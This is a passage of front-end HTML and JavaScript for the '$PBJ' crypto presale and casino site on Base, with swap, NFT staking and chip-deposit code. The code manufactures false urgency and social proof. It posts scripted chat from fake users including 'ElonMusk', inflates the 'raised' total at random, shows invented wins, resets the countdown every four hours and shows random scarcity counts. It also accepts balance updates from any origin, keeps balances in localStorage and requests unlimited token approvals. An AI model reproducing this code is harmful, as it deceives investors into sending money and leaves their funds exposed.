            <div class="p-4 bg-[#080808] border-t border-white/5 shrink-0">
                <div class="relative group">
                    <input type="text" placeholder="Say something..." class="w-full bg-[#121212] text-xs text-white p-3 rounded border border-white/10 outline-none focus:border-gold/30 transition pr-10">
                    <button class="absolute right-3 top-3 text-gray-500 group-focus-within:text-gold transition"><i class="fas fa-paper-plane"></i></button>
                </div>
            </div>
        </aside>

        <!-- GAME CONTAINER (FIXED FULL SCREEN OVERLAY) -->
        <div id="gameContainer" class="game-frame-container hidden">
            <!-- Game Header -->
            <div class="h-12 flex items-center px-4 bg-[#080808] border-b border-white/5 shrink-0 justify-between">
                <div class="flex items-center gap-2">
                    <button onclick="showSection('home')" class="text-white flex items-center gap-1 text-[10px] font-bold bg-white/10 px-3 py-1.5 rounded border border-white/5"><i class="fas fa-arrow-left"></i> EXIT</button>
                    <span id="activeGameTitle" class="text-gold font-bold text-xs uppercase ml-2">Game</span>
                </div>
                <div class="flex items-center gap-2 bg-[#121212] px-3 py-1 rounded border border-white/5">
                    <span class="text-[10px] text-gray-500 uppercase font-bold">PBJ:</span>
                    <span class="text-white font-bold font-mono text-xs" id="inGameBalance">0.00</span>
                </div>
            </div>
            <!-- Iframe fills remaining space -->
            <iframe id="gameFrame" class="w-full h-full border-none bg-[#020202]" src="about:blank" allow="autoplay"></iframe>
        </div>
    </div>

    <!-- MOBILE STICKY CTA -->
    <div id="mobileStickyCTA" class="md:hidden fixed bottom-0 left-0 w-full bg-[#121212] border-t border-gold/20 p-3 z-40 flex items-center gap-3 shadow-[0_-5px_20px_rgba(0,0,0,0.8)]">
        <div class="flex-1">
            <p class="text-[9px] text-gray-400 uppercase leading-none mb-1">Price Increases In:</p>
            <p class="text-xs text-white font-mono font-bold" id="mobileTimer">04:23:12</p>
        </div>
        <button onclick="document.getElementById('homeSection').scrollIntoView({behavior:'smooth'})" class="flex-[2] btn-gold rounded py-3 text-xs shadow-[0_0_15px_rgba(255,215,0,0.3)] animate-pulse font-black">
            BUY $PBJ NOW
        </button>
    </div>

    <!-- ROADMAP MODAL PRO -->
<div id="roadmapModal" class="fixed inset-0 z-[60] bg-[#050505]/95 hidden items-center justify-center p-4 backdrop-blur-md transition-all duration-300">
    
    <!-- Modal Container -->
    <div class="bg-[#0f0f0f] border border-gold/20 p-0 rounded-xl max-w-2xl w-full relative shadow-[0_0_60px_rgba(255,215,0,0.05)] overflow-hidden flex flex-col max-h-[90vh]">
        
        <!-- Header con Fondo Sutil -->
        <div class="p-8 border-b border-white/5 bg-gradient-to-r from-gold/10 to-transparent relative">
            <button onclick="document.getElementById('roadmapModal').style.display='none'" class="absolute top-6 right-6 text-gray-400 hover:text-white transition-colors">
                <i class="fas fa-times text-xl"></i>
            </button>
            <h3 class="text-3xl font-black text-white brand-font tracking-wide uppercase">
                Strategic <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold to-yellow-200">Roadmap</span>
            </h3>
            <p class="text-gray-400 text-sm mt-2 font-light">Ecosistema de escalabilidad y retorno de inversi칩n.</p>
        </div>

        <!-- Scrollable Content -->
        <div class="p-8 overflow-y-auto custom-scrollbar">
            <div class="space-y-8 border-l border-white/10 pl-8 ml-3 relative">
                
                <!-- PHASE 1: COMPLETED/CURRENT -->
                <div class="relative group">
                    <!-- Icono de estado (Pulsing) -->
                    <span class="absolute -left-[41px] top-1 flex h-6 w-6 items-center justify-center">
                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-gold opacity-20"></span>
                        <span class="relative inline-flex rounded-full h-3 w-3 bg-gold shadow-[0_0_15px_#FFD700]"></span>
                    </span>
                    
                    <div class="flex items-center justify-between mb-2">
                        <h4 class="text-white font-bold text-lg">Phase 1: Foundation & TGE</h4>
                        <span class="bg-gold/10 text-gold text-[10px] font-bold px-2 py-1 rounded border border-gold/20 uppercase tracking-wider">In Progress</span>
                    </div>
                    <ul class="space-y-2">
                        <li class="flex items-start text-sm text-gray-300">
                            <i class="fas fa-check-circle text-gold mt-1 mr-2 text-xs"></i>
                            <span>Smart Contract Audit (Certik/SolidProof)</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-300">
                            <i class="fas fa-check-circle text-gold mt-1 mr-2 text-xs"></i>
                            <span>$PBJ Presale & Public Launch</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-300">
                            <i class="fas fa-sync fa-spin text-gold mt-1 mr-2 text-xs"></i>
                            <span class="text-white">Community Acquisition (10k+ Members)</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-300">
                            <i class="fas fa-arrow-right text-gray-500 mt-1 mr-2 text-xs"></i>
                            <span>CoinGecko & CMC Fast-Track</span>
                        </li>
                    </ul>
                </div>

                <!-- PHASE 2: UPCOMING -->
                <div class="relative group">
                    <span class="absolute -left-[41px] top-1 flex h-6 w-6 items-center justify-center">
                        <span class="h-3 w-3 rounded-full bg-gray-800 border border-white/20 group-hover:border-gold/50 group-hover:bg-gold/20 transition-all"></span>
                    </span>
                    
                    <div class="flex items-center justify-between mb-2">
                        <h4 class="text-gray-200 font-bold text-lg group-hover:text-gold transition-colors">Phase 2: Utility & Expansion</h4>
                        <span class="text-gray-500 text-[10px] font-bold px-2 py-1 rounded border border-white/5 uppercase tracking-wider">Q3 2024</span>
                    </div>
                    <ul class="space-y-2 opacity-80 group-hover:opacity-100 transition-opacity">
                        <li class="flex items-start text-sm text-gray-400">
                            <i class="fas fa-circle text-[6px] text-gray-600 mt-2 mr-3 group-hover:text-gold"></i>
                            <span><strong>Poker PvP Platform Beta</strong> (Web3 Integration)</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-400">
                            <i class="fas fa-circle text-[6px] text-gray-600 mt-2 mr-3 group-hover:text-gold"></i>
                            <span>Strategic CEX Listings (Tier 2)</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-400">
                            <i class="fas fa-circle text-[6px] text-gray-600 mt-2 mr-3 group-hover:text-gold"></i>
                            <span>Staking Protocol Launch (APY Active)</span>
                        </li>
                    </ul>
                </div>

                <!-- PHASE 3: SCALING -->
                <div class="relative group">
                    <span class="absolute -left-[41px] top-1 flex h-6 w-6 items-center justify-center">
                        <span class="h-3 w-3 rounded-full bg-gray-800 border border-white/20"></span>
                    </span>
                    
                    <div class="flex items-center justify-between mb-2">
                        <h4 class="text-gray-400 font-bold text-lg group-hover:text-white transition-colors">Phase 3: Revenue & Scaling</h4>
                        <span class="text-gray-600 text-[10px] font-bold px-2 py-1 rounded border border-white/5 uppercase tracking-wider">Q4 2024</span>
                    </div>
                    <ul class="space-y-2 opacity-60 group-hover:opacity-100 transition-opacity">
                        <li class="flex items-start text-sm text-gray-500 group-hover:text-gray-300">
                            <i class="fas fa-circle text-[6px] text-gray-700 mt-2 mr-3"></i>
                            <span><strong>Revenue Share Distribution</strong> (ETH Dividends)</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-500 group-hover:text-gray-300">
                            <i class="fas fa-circle text-[6px] text-gray-700 mt-2 mr-3"></i>
                            <span>Tier 1 CEX Listings (Binance/ByBit target)</span>
                        </li>
                        <li class="flex items-start text-sm text-gray-500 group-hover:text-gray-300">
                            <i class="fas fa-circle text-[6px] text-gray-700 mt-2 mr-3"></i>
                            <span>PepeRoyal Sports Betting Module</span>
                        </li>
                    </ul>
                </div>

                <!-- PHASE 4: MATURITY -->
                <div class="relative group">
                    <span class="absolute -left-[41px] top-1 flex h-6 w-6 items-center justify-center">
                        <span class="h-3 w-3 rounded-full bg-gray-800 border border-white/10"></span>
                    </span>
                    
                    <div class="flex items-center justify-between mb-2">
                        <h4 class="text-gray-500 font-bold text-lg">Phase 4: Governance & DAO</h4>
                        <span class="text-gray-700 text-[10px] font-bold px-2 py-1 rounded border border-white/5 uppercase tracking-wider">2025</span>
                    </div>
                    <p class="text-xs text-gray-600 italic">Global marketing campaigns, DAO Voting implementation, and Cross-chain expansion.</p>
                </div>
            </div>
        </div>

        <!-- Footer / Investor CTA -->
        <div class="p-6 border-t border-white/10 bg-[#0a0a0a] flex flex-col sm:flex-row items-center justify-between gap-4">
            <div class="text-xs text-gray-500">
                <p>Roadmap subject to community governance votes.</p>
            </div>
            <button class="bg-white text-black hover:bg-gold hover:text-black transition-all font-bold text-xs uppercase px-6 py-3 rounded-sm w-full sm:w-auto flex items-center justify-center gap-2">
                <i class="fas fa-download"></i> Download Pitch Deck
            </button>
        </div>
    </div>
</div>

    <!-- BRIDGE MODAL (ChangeNOW Widget) -->
<div id="bridgeModal" class="fixed inset-0 z-[70] bg-black/95 hidden items-center justify-center p-4 backdrop-blur-md transition-all">
    <div class="bg-[#121212] border border-white/10 p-0 rounded-xl max-w-md w-full relative shadow-2xl overflow-hidden flex flex-col h-[600px] max-h-[90vh]">
        
        <!-- Header -->
        <div class="bg-[#0a0a0a] p-4 border-b border-white/10 flex justify-between items-center shrink-0">
            <h3 class="text-white font-bold text-sm uppercase flex items-center gap-2">
                <i class="fas fa-exchange-alt text-gold"></i> Bridge to Base
            </h3>
            <button onclick="document.getElementById('bridgeModal').style.display='none'" class="text-gray-500 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>

        <!-- Instrucciones -->
        <div class="bg-blue-900/20 p-3 border-b border-blue-500/10 shrink-0">
            <p class="text-[10px] text-blue-200 text-center">
                1. Select Source (e.g. SOL). <br>
                2. Select <b>ETH (Base)</b> as destination. <br>
                3. Input your wallet address & send funds.
            </p>
        </div>

        <!-- El Iframe -->
        <div class="flex-1 bg-[#121212] relative w-full h-full">
            <!-- Fallback text / Loading -->
            <div class="absolute inset-0 flex items-center justify-center text-gray-600 text-xs -z-10">
                Loading Secure Bridge...
            </div>
            
            <iframe 
                id="bridgeFrame" 
                src="" 
                width="100%" 
                height="100%" 
                frameborder="0" 
                allow="clipboard-write; camera; payment" 
                style="display: block; width: 100%; height: 100%;">
            </iframe>
        </div>

        <!-- Bot칩n de seguridad por si no carga -->
        <div class="p-3 bg-[#0a0a0a] border-t border-white/10 text-center shrink-0">
            <a href="https://changenow.io/exchange?from=sol&to=eth&amount=2" target="_blank" class="text-[10px] text-gold hover:underline">
                <i class="fas fa-external-link-alt"></i> Widget not loading? Click to bridge externally
            </a>
        </div>
    </div>
</div>

    <!-- SCRIPT COMPLETO -->
    <script>
        // CONFIG
        const PBJ_ADDRESS = "0xff4b4f2076F39550e2C5fD44cb2024Eb06B944E5";
        const NFT_ADDRESS = "0xDE05dAf2cbF59ce9094979d639393ADED494e920";
        const TREASURY_ADDRESS = "0x711ec57A367C381Be6f9d9C5523F2e85C88E03AA"; 
        const CHAIN_ID = 8453; 
        const CHAIN_HEX = "0x2105";
        const RATE = 1000000; 

        const PBJ_ABI = ["function balanceOf(address) view returns (uint256)", "function transfer(address recipient, uint256 amount) returns (bool)", "function approve(address, uint256) returns (bool)", "function allowance(address, address) view returns (uint256)", "function decimals() view returns (uint8)"];
        const NFT_ABI = ["function tierInfo(uint256) view returns (uint256 price, uint256 rewardPerSec, bool active)", "function mint(uint256 _id, uint256 _amount)", "function stake(uint256 _id, uint256 _amount)", "function unstake(uint256 _id, uint256 _amount)", "function claim()", "function getPendingRewards(address _user) view returns (uint256)", "function balanceOf(address, uint256) view returns (uint256)", "function getStakedBalance(address _user, uint256 _id) view returns (uint256)", "function isApprovedForAll(address account, address operator) view returns (bool)", "function setApprovalForAll(address operator, bool approved)"];

        let provider, signer, userAddress, pbjContract, nftContract;
        let gameBalance = 0; 
        let walletBalance = 0;
        let swapMode = 'buy';

        window.onload = () => {
            const savedChips = localStorage.getItem('pepe_chips');
            if(savedChips) gameBalance = parseFloat(savedChips);
            updateUI();
            renderNftMintOptions();
            startCountdown();
            startFakeActivity();
            startRecentBuys();

            if(window.ethereum) {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                window.ethereum.request({ method: 'eth_accounts' }).then(accounts => { if (accounts.length > 0) connectWallet(); });
            }
        };

        // --- MOBILE WALLET CONNECT FIX ---
        async function connectWallet() {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            if(!window.ethereum) {
                if (isMobile) {
                    Swal.fire({
                        title: "Connect Wallet",
                        text: "To connect on mobile, please open this site inside MetaMask App.",
                        icon: "info",
                        showCancelButton: true,
                        confirmButtonText: "Open App",
                        background: '#121212', color: '#fff'
                    }).then((result) => {
                        if (result.isConfirmed) {
                            const currentUrl = window.location.host + window.location.pathname;
                            window.location.href = "https://metamask.app.link/dapp/" + currentUrl;
                        }
                    });
                    return;
                } else {
                    return Swal.fire({ title: "MetaMask Not Found", icon: "error", background: '#121212', color: '#fff' });
                }
            }

            try {
                await provider.send("eth_requestAccounts", []);
                const network = await provider.getNetwork();
                if(network.chainId !== CHAIN_ID) {
                    try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_HEX }] }); } 
                    catch (e) { Swal.fire("Wrong Network", "Switch to Base", "warning"); return; }
                }
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                trackWalletConnection(userAddress); 
                pbjContract = new ethers.Contract(PBJ_ADDRESS, PBJ_ABI, signer);
                nftContract = new ethers.Contract(NFT_ADDRESS, NFT_ABI, signer);
                
                updateWalletData();
                document.getElementById('swapMainBtn').innerText = "SWAP ETH FOR PBJ";
                document.getElementById('referralLinkInput').value = window.location.origin + "/?ref=" + userAddress;
                document.getElementById('connectBtnHeader').innerHTML = `<i class="fas fa-check-circle text-green-500"></i> ${userAddress.substring(0,6)}...`;
            } catch (e) { console.error(e); }
        }

        async function updateWalletData() {
            if(!userAddress) return;
            const rawBal = await pbjContract.balanceOf(userAddress);
            walletBalance = parseFloat(ethers.utils.formatEther(rawBal));
            const ethRaw = await provider.getBalance(userAddress);
            const ethBal = parseFloat(ethers.utils.formatEther(ethRaw)).toFixed(4);
            
            document.getElementById('userNameDisplay').innerText = userAddress.substring(0,6) + "...";
            document.getElementById('headerWalletBal').innerText = walletBalance.toLocaleString(undefined, {maximumFractionDigits: 0});
            document.getElementById('cashierWalletBal').innerText = walletBalance.toLocaleString();
            if(swapMode === 'buy') document.getElementById('balInputA').innerText = ethBal;
            else document.getElementById('balInputA').innerText = walletBalance.toLocaleString();
            updateUI();
        }

        function updateUI() {
            const chips = gameBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
            document.getElementById('headerGameBal').innerText = chips;
            document.getElementById('inGameBalance').innerText = chips;
            document.getElementById('cashierGameBal').innerText = chips;
        }

        // --- NAVIGATION & GAME LOADING (FIXED) ---
        function showSection(id) {
            // 1. Hide Game Overlay (Force Hide with Style)
            const gc = document.getElementById('gameContainer');
            gc.classList.add('hidden');
            gc.style.display = 'none'; // Force hide inline style
            document.getElementById('gameFrame').src = 'about:blank';
            
            // 2. Restore Mobile Elements
            document.getElementById('mobileStickyCTA').style.display = ''; // Revert to CSS
            document.getElementById('mainTicker').style.display = 'block';
            document.querySelector('footer').style.display = 'block';

            ['homeSection','profileSection','nftSection','partnersSection'].forEach(s => {
                const el = document.getElementById(s);
                if(el) el.classList.add('hidden');
            });
            const target = document.getElementById(id+'Section');
            if(target) target.classList.remove('hidden');
            if(window.innerWidth < 1024) document.getElementById('sidebar').classList.remove('open');
            window.scrollTo(0,0);
        }

        function loadGame(url, title) {
            // 1. Hide Main Sections
            ['homeSection','profileSection','nftSection','partnersSection'].forEach(s => {
                const el = document.getElementById(s);
                if(el) el.classList.add('hidden');
            });
            document.querySelector('footer').style.display = 'none';
            
            // 2. Hide Mobile Distractions
            document.getElementById('mobileStickyCTA').style.display = 'none';
            document.getElementById('mainTicker').style.display = 'none';
            if(window.innerWidth < 1024) document.getElementById('sidebar').classList.remove('open');

            // 3. Show Game Container (Fullscreen Overlay)
            const gc = document.getElementById('gameContainer');
            gc.classList.remove('hidden');
            gc.style.display = 'flex';
            
            document.getElementById('activeGameTitle').innerText = title;
            const f = document.getElementById('gameFrame');
            f.src = url;
            
            // Enviar balance al juego cuando cargue
            f.onload = () => f.contentWindow.postMessage({type: 'INIT_BALANCE', balance: gameBalance}, '*');
        }

        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
        function toggleChat() { document.getElementById('chatSidebar').classList.toggle('open'); }

        // --- EXTRAS (Activity, Timer, etc) ---
        function startCountdown() {
            let endTime = localStorage.getItem('presale_end_time');
            if (!endTime || new Date().getTime() > endTime) {
                endTime = new Date().getTime() + (4 * 60 * 60 * 1000); 
                localStorage.setItem('presale_end_time', endTime);
            }

            setInterval(() => {
                const now = new Date().getTime();
                const distance = endTime - now;

                if (distance < 0) {
                    endTime = new Date().getTime() + (4 * 60 * 60 * 1000);
                    localStorage.setItem('presale_end_time', endTime);
                    return;
                }

                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)).toString().padStart(2, '0');
                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)).toString().padStart(2, '0');
                const s = Math.floor((distance % (1000 * 60)) / 1000).toString().padStart(2, '0');
                
                const str = `${h}h ${m}m ${s}s`;
                if(document.getElementById('countdownTimer')) document.getElementById('countdownTimer').innerText = str;
                if(document.getElementById('mobileTimer')) document.getElementById('mobileTimer').innerText = str;
            }, 1000);
        }

        function startFakeActivity() {
             const fakeUsers = ["0xWhale", "GoldenPepe", "BasedGod", "ElonMusk"];
             const fakeMsgs = ["LFG!", "Just bought", "Plinko pays!", "Nice UI"];
             for(let i=0; i<4; i++) addChatMessage(fakeUsers[i], fakeMsgs[i]);
             
             // Live Progress
             let currentRaised = 4280105;
             setInterval(() => {
                if(Math.random() > 0.7) {
                    currentRaised += Math.floor(Math.random() * 500) + 50;
                    const el = document.getElementById('raisedAmount'); 
                    if(el) el.innerText = "$" + currentRaised.toLocaleString() + " / $5M";
                }
             }, 2000);

             setInterval(() => {
                 if(Math.random() > 0.5) showLiveWin("0x"+Math.random().toString(16).substr(2,4), (Math.random()*1000).toFixed(0), "PLINKO");
             }, 5000);
        }
        function addChatMessage(user, msg) {
            const div = document.createElement('div');
            div.className = "flex gap-3 mb-3 animate-fadeIn";
            div.innerHTML = `<div class="text-[10px] text-gray-500"><b class="text-white">${user}</b>: ${msg}</div>`;
            document.getElementById('chatMessages').appendChild(div);
        }
        function showLiveWin(user, amt, game) {
            const container = document.getElementById('liveToastContainer');
            const div = document.createElement('div');
            div.className = "live-toast bg-[#121212] border-t border-r border-b border-white/5 p-3 rounded shadow-2xl pointer-events-none flex gap-3 items-center";
            div.innerHTML = `<div><p class="text-[9px] text-gray-500 font-bold uppercase tracking-wider mb-0.5">${game}</p><p class="text-[10px] text-white"><span class="font-bold text-gold">${user}</span> won ${amt} PBJ</p></div>`;
            container.appendChild(div);
            setTimeout(() => div.remove(), 4000);
        }
        
        // --- NFT, SWAP & EXTRAS ---
        const NFT_LEVELS = [
            {name: "Bronze", price: "5,000", img: "common", supply: 500},
            {name: "Silver", price: "10,000", img: "uncommon", supply: 250},
            {name: "Gold", price: "25,000", img: "rare", supply: 100},
            {name: "Platinum", price: "50,000", img: "epic", supply: 50},
            {name: "Diamond", price: "100,000", img: "legendary", supply: 10}
        ];

        function renderNftMintOptions() {
            let html = "";
            NFT_LEVELS.forEach((tier, i) => {
                const left = Math.floor(Math.random() * (tier.supply / 2)) + 1; 
                html += `<div class="bg-[#0e0e0e] rounded p-4 border border-white/5 hover:border-gold/30 transition group shadow-lg relative">
                    <div class="absolute top-3 left-3 z-30 bg-red-600 text-white text-[9px] font-bold px-2 py-0.5 rounded animate-pulse">Only ${left} Left</div>
                    <div class="h-40 mb-4 relative overflow-hidden rounded bg-black">
                        <img src="assets/img/nft-${tier.img}.png" class="w-full h-full object-cover relative z-10 transition duration-500 group-hover:scale-105 opacity-80 group-hover:opacity-100" alt="${tier.name}">
                    </div>
                    <div class="flex justify-between items-center mb-4"><span class="text-[10px] text-gray-500 font-bold uppercase">Price</span><span class="text-gold font-black text-sm">${tier.price} PBJ</span></div>
                    <button onclick="mintNft(${i}, '${tier.price.replace(',','')}')" class="w-full bg-[#151515] hover:bg-gold hover:text-black text-white py-2 rounded font-bold text-[10px] uppercase tracking-wide border border-white/10 transition">MINT NOW</button>
                </div>`;
            });
            if(document.getElementById('nftMintView')) document.getElementById('nftMintView').innerHTML = html;
        }

        async function mintNft(id, priceStr) {
            if(!userAddress) return connectWallet();
            try {
                const priceWei = ethers.utils.parseEther(priceStr);
                const allowance = await pbjContract.allowance(userAddress, NFT_ADDRESS);
                if(allowance.lt(priceWei)) {
                    Swal.fire({title: 'Approve PBJ', didOpen:()=>Swal.showLoading(), background: '#121212', color: '#fff'});
                    const txApp = await pbjContract.approve(NFT_ADDRESS, ethers.constants.MaxUint256);
                    await txApp.wait();
                }
                Swal.fire({title: 'Minting...', didOpen:()=>Swal.showLoading(), background: '#121212', color: '#fff'});
                const txMint = await nftContract.mint(id, 1);
                await txMint.wait();
                triggerConfetti();
                Swal.fire({title: "Minted!", icon: "success", background: '#121212', color: '#fff'});
                updateWalletData();
            } catch(e) { Swal.fire({title: "Error", text: e.message, icon: "error", background: '#121212', color: '#fff'}); }
        }

        async function loadInventory() {
            if(!userAddress) return;
            const grid = document.getElementById('myNftGrid');
            grid.innerHTML = '<div class="col-span-full text-center text-gold animate-pulse text-xs">Loading Assets...</div>';
            let html = "";
            try {
                const pending = await nftContract.getPendingRewards(userAddress);
                document.getElementById('pendingRewards').innerText = parseFloat(ethers.utils.formatEther(pending)).toFixed(4);
                
                for(let i=0; i<5; i++) {
                    const balance = await nftContract.balanceOf(userAddress, i);
                    const staked = await nftContract.getStakedBalance(userAddress, i);
                    const balNum = balance.toNumber();
                    const stakedNum = staked.toNumber();
                    if(balNum > 0 || stakedNum > 0) {
                        html += `<div class="bg-[#0e0e0e] border border-white/5 rounded p-3">
                            <div class="h-28 bg-black relative overflow-hidden rounded mb-3"><img src="assets/img/nft-${NFT_LEVELS[i].img}.png" class="w-full h-full object-cover opacity-80" alt="${NFT_LEVELS[i].name}"></div>
                            <div class="text-center"><h4 class="font-bold text-[10px] text-white mb-2 uppercase">${NFT_LEVELS[i].name}</h4>
                                <div class="space-y-1">
                                    <div class="bg-[#151515] p-2 rounded flex justify-between items-center text-[9px]"><span class="text-gray-500">Held: <b class="text-white">${balNum}</b></span>${balNum > 0 ? `<button onclick="stakeNft(${i})" class="text-gold hover:underline font-bold">STAKE</button>` : ''}</div>
                                    <div class="bg-[#151515] p-2 rounded flex justify-between items-center text-[9px] border border-gold/10"><span class="text-gold">Staked: <b class="text-white">${stakedNum}</b></span>${stakedNum > 0 ? `<button onclick="unstakeNft(${i})" class="text-red-500 hover:underline font-bold">UNSTAKE</button>` : ''}</div>
                                </div>
                            </div>
                        </div>`;
                    }
                }
                if(html === "") html = '<div class="col-span-full text-center py-10 text-gray-600 text-xs">No assets found.</div>';
                grid.innerHTML = html;
            } catch(e) { console.error(e); }
        }

        async function stakeNft(id) {
            try {
                const isApproved = await nftContract.isApprovedForAll(userAddress, NFT_ADDRESS);
                if(!isApproved) {
                    Swal.fire({title: 'Approve Staking', didOpen:()=>Swal.showLoading(), background: '#121212', color: '#fff'});
                    const txApp = await nftContract.setApprovalForAll(NFT_ADDRESS, true);
                    await txApp.wait();
                }
                Swal.fire({title: 'Staking...', didOpen:()=>Swal.showLoading(), background: '#121212', color: '#fff'});
                const tx = await nftContract.stake(id, 1);
                await tx.wait();
                Swal.fire({title: "Staked!", icon: "success", background: '#121212', color: '#fff'});
                loadInventory();
            } catch(e) { Swal.fire({title: "Error", text: e.message, icon: "error", background: '#121212', color: '#fff'}); }
        }

        async function unstakeNft(id) {
            try {
                Swal.fire({title: 'Unstaking...', didOpen:()=>Swal.showLoading(), background: '#121212', color: '#fff'});
                const tx = await nftContract.unstake(id, 1);
                await tx.wait();
                Swal.fire({title: "Unstaked!", icon: "success", background: '#121212', color: '#fff'});
                loadInventory();
            } catch(e) { Swal.fire({title: "Error", text: e.message, icon: "error", background: '#121212', color: '#fff'}); }
        }

        async function claimRewards() {
            try {
                Swal.fire({title: 'Claiming...', didOpen:()=>Swal.showLoading(), background: '#121212', color: '#fff'});
                const tx = await nftContract.claim();
                await tx.wait();
                triggerConfetti();
                Swal.fire({title: "Success", text: "PBJ sent to wallet!", icon: "success", background: '#121212', color: '#fff'});
                updateWalletData();
                loadInventory();
            } catch(e) { Swal.fire({title: "Error", text: e.message, icon: "error", background: '#121212', color: '#fff'}); }
        }

        function switchNftTab(tab) {
             if(tab==='mint') { 
                 document.getElementById('nftMintView').classList.remove('hidden'); 
                 document.getElementById('nftInventoryView').classList.add('hidden');
                 document.getElementById('tabMint').classList.add('bg-gold', 'text-black');
                 document.getElementById('tabMint').classList.remove('text-gray-400');
                 document.getElementById('tabInventory').classList.remove('bg-gold', 'text-black');
                 document.getElementById('tabInventory').classList.add('text-gray-400');
             } else { 
                 document.getElementById('nftMintView').classList.add('hidden'); 
                 document.getElementById('nftInventoryView').classList.remove('hidden'); 
                 document.getElementById('tabMint').classList.remove('bg-gold', 'text-black');
                 document.getElementById('tabMint').classList.add('text-gray-400');
                 document.getElementById('tabInventory').classList.add('bg-gold', 'text-black');
                 document.getElementById('tabInventory').classList.remove('text-gray-400');
                 loadInventory(); 
             }
        }

        function setMaxETH() {
            if(!walletBalance) return;
            let max = walletBalance - 0.01; 
            if(max < 0) max = 0;
            document.getElementById('inputA').value = max.toFixed(4);
            handleInputA();
        }

        function updateCalc(val) {
             document.getElementById('calcHold').innerText = parseInt(val).toLocaleString();
             document.getElementById('calcEarn').innerText = (val * 0.000009).toFixed(4);
        }
        function toggleSwapMode(mode) { swapMode = mode; updateWalletData(); }
        function handleInputA() { 
    const valA = parseFloat(document.getElementById('inputA').value);
    const bonusBar = document.getElementById('bonusBar');
    const bonusMsg = document.getElementById('bonusMsg');
    const currentBonus = document.getElementById('currentBonus');

    if(isNaN(valA) || valA === 0) { 
        document.getElementById('inputB').value = ''; 
        bonusBar.style.width = "0%";
        return; 
    }

    // L칩gica de Bonus Visual
    let width = 0;
    let txt = "Add more to unlock bonus!";
    let bonusTxt = "0%";

    if(valA < 0.5) {
        width = (valA / 0.5) * 50; // 0 a 50% de la barra
        txt = `Add ${(0.5 - valA).toFixed(2)} ETH for 5% Bonus`;
    } else if (valA >= 0.5 && valA < 1.0) {
        width = 50 + ((valA - 0.5) / 0.5) * 50; // 50 a 100%
        txt = `游댠 5% APPLIED! Add ${(1.0 - valA).toFixed(2)} ETH for 10% WHALE BONUS`;
        bonusTxt = "5%";
        bonusBar.classList.add("from-gold", "to-yellow-500"); // Cambiar a dorado
    } else {
        width = 100;
        txt = "游녬 WHALE STATUS: 10% MAX BONUS APPLIED";
        bonusTxt = "10%";
    }

    bonusBar.style.width = width + "%";
    bonusMsg.innerText = txt;
    currentBonus.innerText = bonusTxt;

    // C치lculo normal
    let total = swapMode === 'buy' ? valA * RATE : valA / RATE;
    
    // Aplicar bonus matem치tico al output
    if(valA >= 1.0) total = total * 1.10;
    else if(valA >= 0.5) total = total * 1.05;

    document.getElementById('inputB').value = total.toLocaleString(undefined, {useGrouping: false});
}
        function handleInputB() {
            const val = parseFloat(document.getElementById('inputB').value);
            if(!isNaN(val)) document.getElementById('inputA').value = swapMode==='buy' ? val/RATE : val*RATE;
        }
        
        // --- SWAP ACTION RESTORED ---
        async function handleSwapAction() {
            if(!userAddress) return connectWallet();
            const val = document.getElementById('inputA').value; 
            if(!val || parseFloat(val) <= 0) return Swal.fire("Error", "Enter an amount", "warning");

            try {
                Swal.fire({title: 'Confirm Transaction', didOpen: () => Swal.showLoading(), background: '#121212', color: '#fff'});
                const tx = await signer.sendTransaction({ 
                    to: PBJ_ADDRESS, 
                    value: ethers.utils.parseEther(val) 
                });
                Swal.fire({title: 'Processing...', text: 'Waiting for blockchain confirmation...', background: '#121212', color: '#fff'});
                await tx.wait();
                await updateWalletData();
                triggerConfetti();
                Swal.fire({title: "Success!", text: "PBJ Tokens purchased.", icon: "success", background: '#121212', color: '#fff'});
            } catch(e) { 
                console.error(e);
                if(e.code === 'ACTION_REJECTED') Swal.fire("Rejected", "You rejected the transaction.", "error");
                else Swal.fire("Error", e.message || "Transaction failed", "error"); 
            }
        }

        function copyRefLink() {
            navigator.clipboard.writeText(document.getElementById('referralLinkInput').value);
            Swal.fire({icon:'success', title:'Copied!', timer:1000, showConfirmButton:false, background:'#121212', color:'#fff'});
        }
        
        // Listen for Game Balance Updates
        window.addEventListener('message', (event) => {
            if (event.data.type === 'UPDATE_BALANCE') {
                gameBalance = event.data.amount > 0 ? gameBalance + event.data.amount : gameBalance - Math.abs(event.data.amount);
                updateUI();
                localStorage.setItem('pepe_chips', gameBalance);
            }
        });

        // --- NEW DEPOSIT LOGIC (Fixing the "Loading" issue) ---
        async function depositChips() {
            if(!userAddress) return connectWallet();
            const amountVal = document.getElementById('depositInput').value;
            if(!amountVal || parseFloat(amountVal) <= 0) return Swal.fire("Error", "Enter a valid amount", "warning");

            try {
                // 1. Confirm UI
                const result = await Swal.fire({
                    title: 'Deposit $PBJ',
                    text: `Send ${amountVal} PBJ to Game Balance?`,
                    icon: 'question',
                    showCancelButton: true,
                    confirmButtonColor: '#FFD700',
                    confirmButtonText: 'CONFIRM',
                    background: '#121212', color: '#fff'
                });

                if(!result.isConfirmed) return;

                // 2. Blockchain Transaction
                const amountWei = ethers.utils.parseUnits(amountVal, 18); // Assuming 18 decimals
                
                Swal.fire({title: 'Processing...', didOpen: () => Swal.showLoading(), background: '#121212', color: '#fff'});
                
                // Note: In a real app, you might need approve() first if the contract pulls tokens.
                // But here, we are just transferring to the Treasury address manually.
                const tx = await pbjContract.transfer(TREASURY_ADDRESS, amountWei);
                
                await tx.wait(); // Wait for mining

                // 3. Update Local State (Simulate instant credit)
                gameBalance += parseFloat(amountVal);
